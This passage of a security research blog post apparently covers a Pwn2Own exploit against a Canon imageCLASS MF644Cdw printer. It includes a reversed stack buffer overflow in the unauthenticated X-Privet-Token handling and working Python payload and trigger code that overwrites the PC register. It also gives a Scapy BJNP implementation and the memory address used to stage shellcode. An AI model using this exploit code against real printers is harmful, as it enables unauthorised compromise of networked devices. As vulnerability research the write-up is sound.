+<p>So our encryption algorithm was a trivial <code>ror(x-i, 1)</code>!</p>
+<h2 id="exploiting-setup">Exploiting setup</h2>
+<p>After we decrypted the firmware and noticed the serial port, we decided to set up an environment that would facilitate our exploitation of the vulnerability.</p>
+<p><center><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/arch.jpg" /></center></p>
+<p>We set up a Raspberry Pi on the same network as the printer that we also connected to the serial port of the printer. In this way we could remotely exploit the vulnerability while controlling the status of the printer via many features offered by the serial port.</p>
+<h2 id="serial-port-dry-shell">Serial port: dry shell</h2>
+<p>The serial port gave us access to the aforementioned dry shell which provided incredible help to understand / control the printer status and debug it during our exploitation attempts.</p>
+<p><center><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dryshell.jpg" /></center></p>
+<p>Among the many powerful features offered, here are the most useful ones:</p>
+<ul>
+<li>The ability to perform a full memory dump:  a simple and quick way to retrieve the updated firmware unencrypted.</li>
+<li>The ability to perform basic filesystem operations.</li>
+<li>
+<p>The ability to list the running tasks and their associated memory segments.
+    <center><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/taskl.png" /></center></p>
+</li>
+<li>
+<p>The ability to start an FTP daemon, this will come handy later.</p>
+</li>
+<li>
+<p>The ability to inspect the content of memory at a specific address.</p>
+<p><center><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/drymemory.jpg" /></center></p>
+</li>
+</ul>
+<p>This feature was used a lot to understand what was going on during exploitation attempts. One of the annoying things is the presence of a watchdog which restarts the whole printer if the HTTP daemon crashes. We had to run this command quickly after any exploitation attempts.</p>
+<h1 id="vulnerability">Vulnerability</h1>
+<h2 id="attack-surface">Attack surface</h2>
+<p>The Pwn2Own rules state that if there's authentication, it should be bypassed. Thus, the easiest way to win is to find a vulnerability in a non authenticated feature. This includes obvious things like:</p>
+<ul>
+<li>Printing functions and protocols,</li>
+<li>Various web pages,</li>
+<li>The HTTP server,</li>
+<li>The SNMP server.</li>
+</ul>
+<p>We started by enumerating the "regular" web pages that are handled by the web server (by checking the registered pages in the code), including the weird <code>/elf/</code> subpages. We then realized some other URLs were available in the firmware, which were not obviously handled by the usual code: <code>/privet/</code>, which are used for cloud based printing.</p>
+<h2 id="vulnerable-function">Vulnerable function</h2>
+<p>Reverse engineering the firmware is rather straightforward, even if the binary is big. The CPU is standard ARMv7. By reversing the handlers, we quickly found the following function. Note that all names were added manually, either taken from debug logging strings or after reversing:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">ntpv_isXPrivetTokenValid</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">token</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">tklen</span><span class="p">;</span> <span class="c1">// r0</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">colon</span><span class="p">;</span> <span class="c1">// r1</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// r1</span>
+  <span class="kt">int</span> <span class="n">timestamp</span><span class="p">;</span> <span class="c1">// r4</span>
+  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// r2</span>
+  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// r3</span>
+  <span class="kt">int</span> <span class="n">lvl</span><span class="p">;</span> <span class="c1">// r1</span>
+  <span class="kt">int</span> <span class="n">time_delta</span><span class="p">;</span> <span class="c1">// r0</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">;</span> <span class="c1">// r2</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [sp+4h] [bp-174h] BYREF</span>
+  <span class="kt">char</span> <span class="n">str_to_hash</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span> <span class="c1">// [sp+104h] [bp-74h] BYREF</span>
+  <span class="kt">char</span> <span class="n">sha1_res</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span> <span class="c1">// [sp+120h] [bp-58h] BYREF</span>
+  <span class="kt">int</span> <span class="n">sha1_from_token</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// [sp+138h] [bp-40h] BYREF</span>
+  <span class="kt">char</span> <span class="n">last_part</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span> <span class="c1">// [sp+150h] [bp-28h] BYREF</span>
+  <span class="kt">int</span> <span class="n">now</span><span class="p">;</span> <span class="c1">// [sp+15Ch] [bp-1Ch] BYREF</span>
+  <span class="kt">int</span> <span class="n">sha1len</span><span class="p">;</span> <span class="c1">// [sp+164h] [bp-14h] BYREF</span>
+
+  <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
+  <span class="n">bzero</span><span class="p">(</span><span class="n">sha1_from_token</span><span class="p">,</span> <span class="mh">0x18u</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">last_part</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">last_part</span><span class="p">));</span>
+  <span class="n">bzero</span><span class="p">(</span><span class="n">str_to_hash</span><span class="p">,</span> <span class="mh">0x1Cu</span><span class="p">);</span>
+  <span class="n">bzero</span><span class="p">(</span><span class="n">sha1_res</span><span class="p">,</span> <span class="mh">0x18u</span><span class="p">);</span>
+  <span class="n">sha1len</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">ischeckXPrivetToken</span><span class="p">()</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">tklen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
+    <span class="n">base64decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">tklen</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    <span class="n">colon</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;:&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">colon</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">strncpy</span><span class="p">(</span><span class="n">sha1_from_token</span><span class="p">,</span> <span class="n">colon</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+      <span class="n">v4</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&quot;:&quot;</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
+        <span class="n">strncpy</span><span class="p">(</span><span class="n">last_part</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">sprintf_0</span><span class="p">(</span><span class="n">str_to_hash</span><span class="p">,</span> <span class="s">&quot;%s%s%s&quot;</span><span class="p">,</span> <span class="n">x_privet_secret</span><span class="p">,</span> <span class="s">&quot;:&quot;</span><span class="p">,</span> <span class="n">last_part</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">sha1</span><span class="p">(</span><span class="n">str_to_hash</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="n">sha1_res</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sha1len</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">sha1_res</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp_0</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">sha1_from_token</span><span class="p">,</span> <span class="n">sha1_res</span><span class="p">,</span> <span class="mh">0x14u</span><span class="p">)</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">timestamp</span> <span class="o">=</span> <span class="n">strtol2</span><span class="p">(</span><span class="n">last_part</span><span class="p">);</span>
+        <span class="n">time</span><span class="p">(</span><span class="o">&amp;</span><span class="n">now</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
+        <span class="n">lvl</span> <span class="o">=</span> <span class="mi">86400</span><span class="p">;</span>
+        <span class="n">time_delta</span> <span class="o">=</span> <span class="n">now</span> <span class="o">-</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">qword_470B80E0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">timestamp</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">time_delta</span> <span class="o">&lt;=</span> <span class="mi">86400</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">msg</span> <span class="o">=</span> <span class="s">&quot;[NTPV] %s: x-privet-token is valid.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
+          <span class="n">lvl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+          <span class="n">msg</span> <span class="o">=</span> <span class="s">&quot;[NTPV] %s: issue_timecounter is expired!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">time_delta</span> <span class="o">&lt;=</span> <span class="mi">86400</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">log</span><span class="p">(</span><span class="mi">3661</span><span class="p">,</span> <span class="n">lvl</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="s">&quot;ntpv_isXPrivetTokenValid&quot;</span><span class="p">);</span>
+          <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">log</span><span class="p">(</span><span class="mi">3661</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="s">&quot;ntpv_isXPrivetTokenValid&quot;</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="n">log</span><span class="p">(</span><span class="mi">3661</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="s">&quot;[NTPV] %s: SHA1 hash value is invalid!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;ntpv_isXPrivetTokenValid&quot;</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">log</span><span class="p">(</span><span class="mi">3661</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s">&quot;[NTPV] ERROR %s fail to generate hash string.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;ntpv_isXPrivetTokenValid&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">log</span><span class="p">(</span><span class="mi">3661</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="s">&quot;[NTPV] %s() DEBUG MODE: Don&#39;t check X-Privet-Token.&quot;</span><span class="p">,</span> <span class="s">&quot;ntpv_isXPrivetTokenValid&quot;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>The vulnerable code is the following line:</p>
+<div class="highlight"><pre><span></span><code><span class="n">base64decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">tklen</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</code></pre></div>
+
+
+<p>With some thought, one can recognize the bug from the function signature itself -- there is no buffer length parameter passed in, meaning <code>base64decode</code> has no knowledge of buffer bounds.
+In this case, it decodes the base64-encoded value of the <code>X-Privet-Token</code> header into the local, stack based <code>buffer</code> which is 256 bytes long. The header is attacker-controlled is limited only by HTTP constraints, and as a result can be much larger. This leads to a textbook stack-based buffer overflow. The stack frame is relatively simple:</p>
+<div class="highlight"><pre><span></span><code>-00000178 var_178         DCD ?
+-00000174 buffer          DCB 256 dup(?)
+-00000074 str_to_hash     DCB 28 dup(?)
+-00000058 sha1_res        DCB 20 dup(?)
+-00000044 var_44          DCD ?
+-00000040 sha1_from_token DCB 24 dup(?)
+-00000028 last_part       DCB 12 dup(?)
+-0000001C now             DCD ?
+-00000018                 DCB ? ; undefined
+-00000017                 DCB ? ; undefined
+-00000016                 DCB ? ; undefined
+-00000015                 DCB ? ; undefined
+-00000014 sha1len         DCD ?
+-00000010
+-00000010 ; end of stack variables
+</code></pre></div>
+
+
+<p>The <code>buffer</code> array is not really far from the stored return address, so exploitation should be relatively easy. Initially, we found the call to the vulnerable function in the <code>/privet/printer/createjob</code> URL handler, which is <em>not</em> accessible before authenticating, so we had to dig a bit more.</p>
+<h2 id="ntpv-functions">ntpv functions</h2>
+<p>The various ntpv URLs and handlers are nicely defined in two different arrays of structures as you can see below:</p>
+<div class="highlight"><pre><span></span><code><span class="n">privet_url</span> <span class="n">nptv_urls</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span>
+<span class="p">{</span>
+  <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&quot;/privet/info&quot;</span><span class="p">,</span> <span class="s">&quot;GET&quot;</span> <span class="p">},</span>
+  <span class="p">{</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;/privet/register&quot;</span><span class="p">,</span> <span class="s">&quot;POST&quot;</span> <span class="p">},</span>
+  <span class="p">{</span> <span class="mi">2</span><span class="p">,</span> <span class="s">&quot;/privet/accesstoken&quot;</span><span class="p">,</span> <span class="s">&quot;GET&quot;</span> <span class="p">},</span>
+  <span class="p">{</span> <span class="mi">3</span><span class="p">,</span> <span class="s">&quot;/privet/capabilities&quot;</span><span class="p">,</span> <span class="s">&quot;GET&quot;</span> <span class="p">},</span>
+  <span class="p">{</span> <span class="mi">4</span><span class="p">,</span> <span class="s">&quot;/privet/printer/createjob&quot;</span><span class="p">,</span> <span class="s">&quot;POST&quot;</span> <span class="p">},</span>
+  <span class="p">{</span> <span class="mi">5</span><span class="p">,</span> <span class="s">&quot;/privet/printer/submitdoc&quot;</span><span class="p">,</span> <span class="s">&quot;POST&quot;</span> <span class="p">},</span>
+  <span class="p">{</span> <span class="mi">6</span><span class="p">,</span> <span class="s">&quot;/privet/printer/jobstate&quot;</span><span class="p">,</span> <span class="s">&quot;GET&quot;</span> <span class="p">},</span>
+  <span class="p">{</span> <span class="mi">7</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">}</span>
+<span class="p">};</span>
+</code></pre></div>
+
+
+<div class="highlight"><pre><span></span><code>DATA:45C91C0C nptv_cmds       id_cmd &lt;0, ntpv_procInfo&gt;
+DATA:45C91C0C                                         ; DATA XREF: ntpv_cgiMain+338↑o
+DATA:45C91C0C                                         ; ntpv_cgiMain:ntpv_cmds↑o
+DATA:45C91C0C                 id_cmd &lt;1, ntpv_procRegister&gt;
+DATA:45C91C0C                 id_cmd &lt;2, ntpv_procAccesstoken&gt;
+DATA:45C91C0C                 id_cmd &lt;3, ntpv_procCapabilities&gt;
+DATA:45C91C0C                 id_cmd &lt;4, ntpv_procCreatejob&gt;
+DATA:45C91C0C                 id_cmd &lt;5, ntpv_procSubmitdoc&gt;
+DATA:45C91C0C                 id_cmd &lt;6, ntpv_procJobstate&gt;
+DATA:45C91C0C                 id_cmd &lt;7, 0&gt;
+</code></pre></div>
+
+
+<p>After reading the <a href="https://developers.google.com/cloud-print/docs/privet">documentation</a> and reversing the code, it appeared that the <code>register</code> URL was accessible without authentication and called the vulnerable
+code.</p>
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="triggering-the-bug">Triggering the bug</h2>
+<p>Using a pattern generated with <a href="https://github.com/trou/rsbkb">rsbkb</a>, we were able to get the following crash on the serial port:</p>
+<div class="highlight"><pre><span></span><code>Dry&gt; &lt; Error Exception &gt;
+ CORE : 0
+ TYPE : prefetch
+ ISR  : FALSE
+ TASK ID   : 269
+ TASK Name : AsC2
+ R 0  : 00000000
+ R 1  : 00000000
+ R 2  : 40ec49fc
+ R 3  : 49789eb4
+ R 4  : 316f4130
+ R 5  : 41326f41
+ R 6  : 6f41336f
+ R 7  : 49c1b38c
+ R 8  : 49d0c958
+ R 9  : 00000000
+ R10  : 00000194
+ R11  : 45c91bc8
+ R12  : 00000000
+ R13  : 4978a030
+ R14  : 4167a1f4
+ PC   : 356f4134
+ PSR  : 60000013
+ CTRL : 00c5187d
+        IE(31)=0
+</code></pre></div>
+
+
+<p>Which gives:</p>
+<div class="highlight"><pre><span></span><code>$ rsbkb bofpattoff 4Ao5
+Offset: 434 (mod 20280) / 0x1b2
+</code></pre></div>
+
+
+<p>Astute readers will note that the offset is too big compared to the local stack frame size, which is only 0x178 bytes. Indeed, the correct offset for <code>PC</code>, from the start of the local buffer is 0x174. The 0x1B2 which we found using the buffer overflow pattern actually triggers a crash elsewhere and makes exploitation way harder. So remember to always check if your offsets make sense.</p>
+<h2 id="buffer-overflow">Buffer overflow</h2>
+<p>As the firmware is lacking protections such as stack cookies, NX, and ASLR, exploiting the buffer overflow should be rather straightforward, despite the printer running <a href="https://en.wikipedia.org/wiki/DRYOS">DRYOS</a> which differs from usual operating systems. Using the information gathered while researching the vulnerability, we built the following class to exploit the vulnerability and overwrite the <code>PC</code> register with an arbitrary address:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="k">class</span> <span class="nc">PrivetPayload</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ret_addr</span><span class="o">=</span><span class="mh">0x1337</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">ret_addr</span>
+
+    <span class="nd">@property</span>
+    <span class="k">def</span> <span class="nf">r4</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x44\x44\x44\x44</span><span class="s2">&quot;</span>
+
+    <span class="nd">@property</span>
+    <span class="k">def</span> <span class="nf">r5</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x55\x55\x55\x55</span><span class="s2">&quot;</span>
+
+    <span class="nd">@property</span>
+    <span class="k">def</span> <span class="nf">r6</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x66\x66\x66\x66</span><span class="s2">&quot;</span>
+
+    <span class="nd">@property</span>
+    <span class="k">def</span> <span class="nf">pc</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">ret_addr</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="fm">__bytes__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span>
+            <span class="sa">b</span><span class="s2">&quot;:&quot;</span> <span class="o">*</span> <span class="mh">0x160</span>
+            <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>  <span class="c1"># pHashStrBufLen</span>
+            <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">r4</span>
+            <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">r5</span>
+            <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">r6</span>
+            <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">pc</span>
+        <span class="p">)</span>
+</code></pre></div>
+
+
+<p>The vulnerability can then be triggered with the following code, assuming the printer's IP address is <code>192.168.1.100</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">http.client</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">privet</span><span class="o">.</span><span class="n">PrivetPayload</span><span class="p">()</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;Content-type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;text/plain&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;X-Privet-Token&quot;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">)),</span>
+<span class="p">}</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s2">&quot;192.168.1.100&quot;</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;/privet/register&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
+</code></pre></div>
+
+
+<p>To confirm that the exploit was extremely reliable, we simply jumped to a debug function's entry point (which printed information to the serial console) and observed it worked consistently — though the printer rebooted afterwards because we hadn't cleaned the stack. </p>
+<p>With this out of the way, we now need to work on writing a useful exploit. After reaching out to the organizers to learn more about their expectations regarding the proof of exploitation, we decided to show a custom image on the printer's LCD screen.</p>
+<p>To do so, we could basically:</p>
+<ul>
+<li>Store our exploit in the buffer used to trigger the overflow and jump into it,</li>
+<li>Find another buffer we controlled and jump into it,</li>
+<li>Rely only on return-oriented programming.</li>
+</ul>
+<p>Though the first method would have been possible (we found a convenient <code>add r3, r3, #0x103 ; bx r3</code> gadget), we were limited by the size of the buffer itself, even more so because parts of it were being rewritten in the function's body. Thus, we decided to look into the second option by checking other protocols supported by the printer.</p>
+<h2 id="bjnp">BJNP</h2>
+<p>One of the supported protocols is BJNP, which was conveniently <a href="https://www.synacktiv.com/sites/default/files/2021-06/thcon2021_canon_printer.pdf">exploited</a> by Synacktiv ninjas on a different printer, accessible on UDP port <code>8611</code>.
+<a href="https://github.com/bitwiseworks/cups-bjnp-os2">This project</a> adds a BJNP backend for CUPS, and the protocol itself is also handled <a href="https://www.wireshark.org/docs/dfref/b/bjnp.html">by Wireshark</a>.</p>
+<p>In our case, BJNP is very useful: it can handle sessions and allows the client to store data (up to <code>0x180</code> bytes) on the printer for the duration of the session, which means we can precisely control until when our payload will remain available in memory. Moreover, this data is stored in the field of a global structure, which means it is always located at the same address for a given firmware. For the sake of our exploit, we reimplemented parts of the protocol using
+<a href="https://scapy.net">Scapy</a>:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">scapy.packet</span> <span class="kn">import</span> <span class="n">Packet</span>
+<span class="kn">from</span> <span class="nn">scapy.fields</span> <span class="kn">import</span> <span class="p">(</span>
+    <span class="n">EnumField</span><span class="p">,</span>
+    <span class="n">ShortField</span><span class="p">,</span>
+    <span class="n">StrLenField</span><span class="p">,</span>
+    <span class="n">BitEnumField</span><span class="p">,</span>
+    <span class="n">FieldLenField</span><span class="p">,</span>
+    <span class="n">StrFixedLenField</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">BJNPPkt</span><span class="p">(</span><span class="n">Packet</span><span class="p">):</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;BJNP Packet&quot;</span>
+
+    <span class="n">BJNP_DEVICE_ENUM</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mh">0x0</span><span class="p">:</span> <span class="s2">&quot;Client&quot;</span><span class="p">,</span>
+        <span class="mh">0x1</span><span class="p">:</span> <span class="s2">&quot;Printer&quot;</span><span class="p">,</span>
+        <span class="mh">0x2</span><span class="p">:</span> <span class="s2">&quot;Scanner&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">BJNP_COMMAND_ENUM</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mh">0x000</span><span class="p">:</span> <span class="s2">&quot;GetPortConfig&quot;</span><span class="p">,</span>
+        <span class="mh">0x201</span><span class="p">:</span> <span class="s2">&quot;GetNICInfo&quot;</span><span class="p">,</span>
+        <span class="mh">0x202</span><span class="p">:</span> <span class="s2">&quot;NICCmd&quot;</span><span class="p">,</span>
+        <span class="mh">0x210</span><span class="p">:</span> <span class="s2">&quot;SessionStart&quot;</span><span class="p">,</span>
+        <span class="mh">0x211</span><span class="p">:</span> <span class="s2">&quot;SessionEnd&quot;</span><span class="p">,</span>
+        <span class="mh">0x212</span><span class="p">:</span> <span class="s2">&quot;GetSessionInfo&quot;</span><span class="p">,</span>
+        <span class="mh">0x220</span><span class="p">:</span> <span class="s2">&quot;DataRead&quot;</span><span class="p">,</span>
+        <span class="mh">0x221</span><span class="p">:</span> <span class="s2">&quot;DataWrite&quot;</span><span class="p">,</span>
+        <span class="mh">0x230</span><span class="p">:</span> <span class="s2">&quot;GetDeviceID&quot;</span><span class="p">,</span>
+        <span class="mh">0x232</span><span class="p">:</span> <span class="s2">&quot;CmdNotify&quot;</span><span class="p">,</span>
+        <span class="mh">0x240</span><span class="p">:</span> <span class="s2">&quot;AppCmd&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">BJNP_ERROR_ENUM</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mh">0x8200</span><span class="p">:</span> <span class="s2">&quot;Invalid header&quot;</span><span class="p">,</span>
+        <span class="mh">0x8300</span><span class="p">:</span> <span class="s2">&quot;Session error&quot;</span><span class="p">,</span>
+        <span class="mh">0x8502</span><span class="p">:</span> <span class="s2">&quot;Session already exists&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">fields_desc</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">StrFixedLenField</span><span class="p">(</span><span class="s2">&quot;magic&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;MFNP&quot;</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="mi">4</span><span class="p">),</span>
+        <span class="n">BitEnumField</span><span class="p">(</span><span class="s2">&quot;device&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">enum</span><span class="o">=</span><span class="n">BJNP_DEVICE_ENUM</span><span class="p">),</span>
+        <span class="n">BitEnumField</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">enum</span><span class="o">=</span><span class="n">BJNP_COMMAND_ENUM</span><span class="p">),</span>
+        <span class="n">EnumField</span><span class="p">(</span><span class="s2">&quot;err_no&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">enum</span><span class="o">=</span><span class="n">BJNP_ERROR_ENUM</span><span class="p">,</span> <span class="n">fmt</span><span class="o">=</span><span class="s2">&quot;!H&quot;</span><span class="p">),</span>
+        <span class="n">ShortField</span><span class="p">(</span><span class="s2">&quot;seq_no&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">0</span><span class="p">),</span>
+        <span class="n">ShortField</span><span class="p">(</span><span class="s2">&quot;sess_id&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">0</span><span class="p">),</span>
+        <span class="n">FieldLenField</span><span class="p">(</span><span class="s2">&quot;body_len&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">length_of</span><span class="o">=</span><span class="s2">&quot;body&quot;</span><span class="p">,</span> <span class="n">fmt</span><span class="o">=</span><span class="s2">&quot;!I&quot;</span><span class="p">),</span>
+        <span class="n">StrLenField</span><span class="p">(</span><span class="s2">&quot;body&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">length_from</span><span class="o">=</span><span class="k">lambda</span> <span class="n">pkt</span><span class="p">:</span> <span class="n">pkt</span><span class="o">.</span><span class="n">body_len</span><span class="p">),</span>
+    <span class="p">]</span>
+</code></pre></div>
+
+
+<p>For our version of the firmware, the BJNP structure is located at <code>0x46F2B294</code> and the session data sent by the client is stored at offset <code>0x24</code>. We also want our payload to run in thumb mode to reduce its size, which means we need to jump to an odd address. All in all, we can simply overwrite the <code>pc</code> register with
+<code>0x46F2B294+0x24+1=0x46F2B2B9</code> in our original payload to reach the BJNP session buffer.</p>
+<h2 id="initial-poc">Initial PoC</h2>
